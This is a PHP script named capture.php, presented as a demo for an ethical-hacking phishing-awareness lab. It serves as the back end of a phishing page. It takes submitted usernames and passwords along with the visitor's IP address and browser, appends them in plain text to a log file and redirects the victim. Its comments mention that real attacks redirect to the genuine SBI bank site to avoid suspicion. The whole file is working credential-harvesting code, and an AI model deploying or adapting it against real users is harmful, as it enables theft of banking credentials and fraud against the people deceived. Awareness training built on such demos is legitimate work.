<?php
// ============================================================
//  capture.php — Credential Logger (EDUCATIONAL USE ONLY)
//  CEH Trainer Demo | Phishing Awareness Lab
//  ⚠️ NEVER use on real users — IT Act 2000 violation
// ============================================================

// ── CONFIG ──────────────────────────────────────────────────
$LOG_FILE   = "captured_creds.txt";   // Log file path
$REDIRECT   = "success.html";         // After capture, redirect here
$TIMESTAMP  = date("Y-m-d H:i:s");
// ────────────────────────────────────────────────────────────

if ($_SERVER["REQUEST_METHOD"] === "POST") {

    // Sanitize input (basic)
    $username  = htmlspecialchars($_POST["username"]  ?? "N/A");
    $password  = htmlspecialchars($_POST["password"]  ?? "N/A");
    $ip        = $_SERVER["REMOTE_ADDR"]              ?? "Unknown";
    $useragent = $_SERVER["HTTP_USER_AGENT"]          ?? "Unknown";

    // ── Log to file ──────────────────────────────────────────
    $log_entry = "
=============================================
[CAPTURED] $TIMESTAMP
---------------------------------------------
  Username  : $username
  Password  : $password
  IP Address: $ip
  Browser   : $useragent
=============================================
";

    file_put_contents($LOG_FILE, $log_entry, FILE_APPEND | LOCK_EX);

    // ── (Optional) Log to console / error_log ────────────────
    error_log("[PHISHING-DEMO] Credentials captured from $ip — User: $username");

    // ── Redirect victim to real site (so they don't suspect) ─
    // In real attacks — they redirect to actual SBI site
    // For demo — we show a success page
    header("Location: $REDIRECT");
    exit();

} else {
    // Direct access to this file
    http_response_code(403);
    echo "<h3>403 Forbidden</h3>";
    exit();
}
?>
